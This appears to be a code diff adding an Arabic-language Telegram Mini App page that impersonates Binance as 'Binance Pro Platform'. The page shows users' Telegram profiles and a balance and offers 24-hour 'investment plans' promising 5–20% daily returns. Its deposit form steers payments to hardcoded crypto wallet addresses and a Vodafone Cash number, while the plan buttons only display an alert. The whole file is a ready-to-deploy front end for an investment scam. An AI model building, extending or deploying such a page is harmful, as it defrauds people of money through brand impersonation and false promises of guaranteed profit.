@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Binance Pro Platform</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;600;700&family=Roboto+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { binance: ['IBM Plex Sans Arabic', 'sans-serif'], num: ['Roboto Mono', 'monospace'] },
+                    colors: { binance: { bg: '#181A20', card: '#1E2329', input: '#2B313A', yellow: '#F0B90B', green: '#0ECB81', textGray: '#848E9C', border: '#2B313A' } }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { font-family: 'IBM Plex Sans Arabic', sans-serif; background-color: #181A20; color: #EAECEF; user-select: none; }
+        .num-font { font-family: 'Roboto Mono', monospace; }
+        ::-webkit-scrollbar { display: none; }
+    </style>
+</head>
+<body class="pb-20 max-w-md mx-auto relative min-h-screen">
+
+    <!-- Header -->
+    <div class="px-4 pt-3 pb-2 flex items-center justify-between border-b border-binance-border bg-binance-bg sticky top-0 z-40">
+        <div class="flex items-center gap-3">
+            <img id="user-avatar" src="https://ui-avatars.com/api/?name=User&background=2B313A&color=F0B90B" class="w-10 h-10 rounded-full border-2 border-binance-yellow object-cover">
+            <div>
+                <h1 id="user-fullname" class="text-xs font-bold text-white">مستخدم تليجرام</h1>
+                <span id="user-username" class="text-[10px] text-binance-textGray font-semibold num-font block">@username</span>
+            </div>
+        </div>
+        <span class="bg-binance-yellow/10 text-binance-yellow text-[10px] font-bold px-2 py-0.5 rounded border border-binance-yellow/20 num-font">VIP 1</span>
+    </div>
+
+    <div class="p-4">
+        <!-- Balance Card -->
+        <section class="bg-binance-card rounded-xl p-4 mb-4 border border-binance-border">
+            <span class="text-xs text-binance-textGray font-semibold">إجمالي الأصول</span>
+            <div class="flex items-baseline gap-2 mb-4 mt-1">
+                <span class="text-3xl font-extrabold text-white num-font" id="user-balance">0.00</span>
+                <span class="text-xs font-bold text-binance-textGray num-font">USD</span>
+            </div>
+            <div class="grid grid-cols-2 gap-3">
+                <button onclick="openModal('deposit')" class="bg-binance-yellow text-black font-extrabold py-2.5 rounded-lg text-xs flex items-center justify-center gap-2"><i class="fa-solid fa-arrow-down-to-line"></i> إيداع</button>
+                <button onclick="openModal('withdraw')" class="bg-binance-input text-white font-bold py-2.5 rounded-lg text-xs flex items-center justify-center gap-2 border border-binance-border"><i class="fa-solid fa-arrow-up-from-line"></i> سحب</button>
+            </div>
+        </section>
+
+        <h2 class="text-sm font-bold text-white mb-3">الخطط الاستثمارية (24 ساعة)</h2>
+        <div class="space-y-3" id="plans-container"></div>
+    </div>
+
+    <!-- Modal Deposit / Withdraw -->
+    <div id="modal-overlay" class="fixed inset-0 bg-black/80 z-50 hidden flex items-end justify-center">
+        <div class="bg-binance-card w-full max-w-md rounded-t-2xl p-5 border-t border-binance-border">
+            <div class="flex justify-between items-center mb-4 border-b border-binance-border pb-2">
+                <h3 id="modal-title" class="text-sm font-bold text-white"></h3>
+                <button onclick="closeModal()" class="text-binance-textGray"><i class="fa-solid fa-xmark text-lg"></i></button>
+            </div>
+            <div id="modal-body"></div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+
+        const WALLETS = { TRC20: "TX9z3kR12mX8pQ7nL4vW6sY0jH5aB1c2D3", BEP20: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", VODAFONE: "01099887766" };
+        let userData = { id: "123456", name: "Guest User" };
+
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            const u = tg.initDataUnsafe.user;
+            userData = { id: u.id.toString(), name: u.first_name };
+            document.getElementById('user-fullname').innerText = `${u.first_name || ''} ${u.last_name || ''}`;
+            document.getElementById('user-username').innerText = u.username ? `@${u.username}` : `ID: ${u.id}`;
+            if (u.photo_url) document.getElementById('user-avatar').src = u.photo_url;
+        }
+
+        function loadBalance() {
+            fetch(`/api/user/${userData.id}`).then(r => r.json()).then(d => {
+                document.getElementById('user-balance').innerText = (d.balance || 0).toFixed(2);
+            });
+        }
+        loadBalance();
+
+        const plans = [
+            { name: "Plan $10", price: 10, profit: "5%", returnAmt: 10.50 },
+            { name: "Plan $20", price: 20, profit: "7%", returnAmt: 21.40 },
+            { name: "Plan $50", price: 50, profit: "10%", returnAmt: 55.00 },
+            { name: "Plan $500", price: 500, profit: "15%", returnAmt: 575.00 },
+            { name: "Plan $1,000", price: 1000, profit: "20%", returnAmt: 1200.00 }
+        ];
+
+        const container = document.getElementById('plans-container');
+        plans.forEach(p => {
+            container.innerHTML += `
+                <div class="bg-binance-card rounded-xl p-3 border border-binance-border flex justify-between items-center">
+                    <div>
+                        <h3 class="text-xs font-bold text-white">${p.name}</h3>
+                        <span class="text-[10px] text-binance-green num-font">عائد $${p.returnAmt} (${p.profit})</span>
+                    </div>
+                    <button onclick="tg.showAlert('تم إرسال الطلب للسيرفر')" class="bg-binance-yellow text-black font-bold px-3 py-1 rounded text-xs">تفعيل</button>
+                </div>`;
+        });
+
+        function openModal(type) {
+            document.getElementById('modal-overlay').classList.remove('hidden');
+            const title = document.getElementById('modal-title');
+            const body = document.getElementById('modal-body');
+
+            if (type === 'deposit') {
+                title.innerText = "إيداع أصول";
+                body.innerHTML = `
+                    <select id="dep-method" onchange="document.getElementById('w-addr').innerText = WALLETS[this.value]" class="w-full bg-binance-input text-white p-2 rounded text-xs mb-2">
+                        <option value="TRC20">USDT (TRC20)</option>
+                        <option value="BEP20">USDT (BEP20)</option>
+                        <option value="VODAFONE">فودافون كاش</option>
+                    </select>
+                    <div class="bg-binance-bg p-2 rounded text-xs text-binance-yellow font-mono mb-2 break-all" id="w-addr">${WALLETS.TRC20}</div>
+                    <input id="dep-amt" type="number" placeholder="المبلغ ($)" class="w-full bg-binance-input p-2 rounded text-xs text-white mb-2">
+                    <input id="dep-tx" type="text" placeholder="رقم المعاملة / رقم المحول منه" class="w-full bg-binance-input p-2 rounded text-xs text-white mb-3">
+                    <button onclick="submitDep()" class="w-full bg-binance-yellow text-black font-bold p-2 rounded text-xs">تأكيد الإيداع</button>`;
+            } else {
+                title.innerText = "سحب أرباح";
+                body.innerHTML = `
+                    <select id="wit-method" class="w-full bg-binance-input text-white p-2 rounded text-xs mb-2">
+                        <option value="TRC20">USDT (TRC20)</option>
+                        <option value="BEP20">USDT (BEP20)</option>
+                        <option value="VODAFONE">فودافون كاش</option>
+                    </select>
+                    <input id="wit-amt" type="number" placeholder="المبلغ ($)" class="w-full bg-binance-input p-2 rounded text-xs text-white mb-2">
+                    <input id="wit-addr" type="text" placeholder="عنوان الاستلام أو رقم فودافون كاش" class="w-full bg-binance-input p-2 rounded text-xs text-white mb-3">
+                    <button onclick="submitWit()" class="w-full bg-binance-green text-black font-bold p-2 rounded text-xs">تأكيد السحب</button>`;
+            }
+        }
+
+        function submitDep() {
+            fetch('/api/deposit', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    userId: userData.id,
+                    userName: userData.name,
+                    amount: parseFloat(document.getElementById('dep-amt').value),
+                    method: document.getElementById('dep-method').value,
+                    details: document.getElementById('dep-tx').value
+                })
+            }).then(() => { closeModal(); tg.showAlert('تم إرسال طلب الإيداع للمراجعة!'); });
+        }
+
+        function submitWit() {
+            fetch('/api/withdraw', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    userId: userData.id,
+                    userName: userData.name,
+                    amount: parseFloat(document.getElementById('wit-amt').value),
+                    method: document.getElementById('wit-method').value,
+                    address: document.getElementById('wit-addr').value
+                })
+            }).then(r => r.json()).then(d => {
+                closeModal();
+                if (d.success) { loadBalance(); tg.showAlert('تم الخصم وتأكيد طلب السحب!'); }
+                else { tg.showAlert(d.error || 'عذراً، حدث خطأ.'); }
+            });
+        }
+
+        function closeModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
+    </script>
+</body>
+</html>
